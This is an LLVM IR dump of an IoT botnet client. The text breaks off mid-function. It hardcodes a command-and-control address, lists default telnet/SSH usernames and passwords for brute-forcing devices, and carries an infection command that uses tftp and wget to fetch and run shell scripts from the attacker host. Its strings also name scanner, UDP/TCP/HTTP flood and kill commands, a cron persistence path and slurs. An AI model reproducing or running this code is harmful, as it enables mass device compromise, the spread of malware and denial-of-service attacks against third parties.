; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@.str = private unnamed_addr constant [21 x i8] c"94.140.120.196:23913\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"letmein\00\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"epicrouter\00\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.19 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.20 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [193 x i8] c"cd /tmp || cd /var/run;rm -f ng.sh gchq.sh;tftp -r ng.sh -g 94.140.120.196;chmod +x ng.sh;sh ng.sh;rm -f ng.sh;wget -q http://94.140.120.196/gchq.sh;chmod +x gchq.sh;sh gchq.sh;rm -f gchq.sh\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"as\00", align 1
@.str.43 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"shell exec\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.46 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.51 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.52 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.53 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"wget -O /tmp/fff\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"FUCKINGFAGGOT\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.63 = private unnamed_addr constant [33 x i8] c"SCANNER SSH/TEL ON | SSH/TEL OFF\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"tel d0rk\0A\00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"TEL ON\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"tel f0rk\0A\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.75 = private unnamed_addr constant [13 x i8] c"LUCKYLILDUDE\00", align 1
@.str.76 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@__const.main.ismokeweed = private unnamed_addr constant [50 x i8] c"/etc/cron.hourly/sockaddr\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@__const.main.r00t3d = private unnamed_addr constant [11 x i8] c"shell exec\00", align 1
@.str.79 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"GUCCILILNIGGA\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@commServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@usernames = dso_local global [10 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@passwords = dso_local global [18 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@pids = dso_local global i32* null, align 8
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@scanPid = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @init_rand(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @trim(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* noundef %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 noundef %16) #11
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 noundef %33) #11
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @zprintf(i8* noundef %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** noundef null, i8* noundef %6, %struct.__va_list_tag* noundef %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @print(i8** noundef %0, i8* noundef %1, %struct.__va_list_tag* noundef %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !11

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !12

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** noundef %106, i8* noundef %113, i32 noundef %114, i32 noundef %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
